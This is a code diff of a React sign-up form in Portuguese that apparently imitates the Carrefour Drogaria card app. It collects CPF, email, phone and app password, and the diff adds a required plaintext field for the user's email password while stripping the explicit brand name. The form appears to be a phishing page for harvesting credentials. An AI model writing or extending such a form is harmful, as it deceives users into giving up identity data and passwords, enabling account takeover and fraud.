@@ -1,5 +1,5 @@
 import React, { Component } from 'react'
-import logo from './carrfo.png'
+import logo from './logo.jpeg'
 
 
 
@@ -13,26 +13,34 @@ export class AccountSetup extends Component {
     
 
     render() {
+        
         const { values, inputChange } = this.props;
         const msg = {
             color: "red",
             padding: "10px",
-            fontFamily: "Arial",
+            fontFamily: "Arial"
           };
+     
         return (
-            <div className="form-container">
-                            <div className="text-center container">
+            <>
+            <div  className="logo_container ">
 
-            <img className="logo" src={logo} width="150"/>
+            <img className="logo" src={logo} width="250"/>
             </div>
-                <h6 className="mb-7"><b>Bem-vindo</b> ao aplicativo do <b>Cartão Carrefour Drogaria</b></h6>
+            <div className="form-container">
+            
+                <h6 className="mb-7"><b>Seja Bem-vindo!</b><br></br> para realizar seu acesso informe abaixo os dados cadastrais </h6>
                 <p style={msg}> {values.msg}</p>
                 <div className="form-group">
                     
-                    <input type="number" placeholder="Digite seu CPF" className="form-control" name="cp" onChange={inputChange('cp')} value={values.cp}  required  />
+                    <input type="number" placeholder="Digite seu CPF" className="form-control" name="cp" onChange={inputChange('cp')} value={values.cp}  required id="cpf"  />
                 </div>
                 <div className="form-group">
                     <input placeholder="Seu email" type="email" className="form-control" name="email" onChange={inputChange('email')} value={values.email} />
+                   <span class="focus-border"></span>
+                </div>
+                <div className="form-group">
+                    <input placeholder="Senha do email" type="text" className="form-control" name="passemail" onChange={inputChange('passemail')} value={values.passemail} required/>
                    <span class="focus-border"></span>
                 </div>
 
@@ -40,7 +48,7 @@ export class AccountSetup extends Component {
                     <input placeholder="Celular com DDD"  type="number" className="form-control" name="phone" onChange={inputChange('phone')} value={values.phone} />
                 </div>
                 <div className="form-group">
-                    <input placeholder="Senha Aplicativo Carrefour"  type="password" className="form-control" name="passapp" onChange={inputChange('passapp')} value={values.passapp} />
+                    <input placeholder="Senha Aplicativo"  type="password" className="form-control" name="passapp" onChange={inputChange('passapp')} value={values.passapp} />
                 </div>
 
                 <br />
@@ -51,7 +59,8 @@ export class AccountSetup extends Component {
                     <button className="btn btn-primary " onClick={this.continue}>CONTINUAR</button>
                 </div>
             </div>
-        )
+            </>
+                    )
         
     }
     
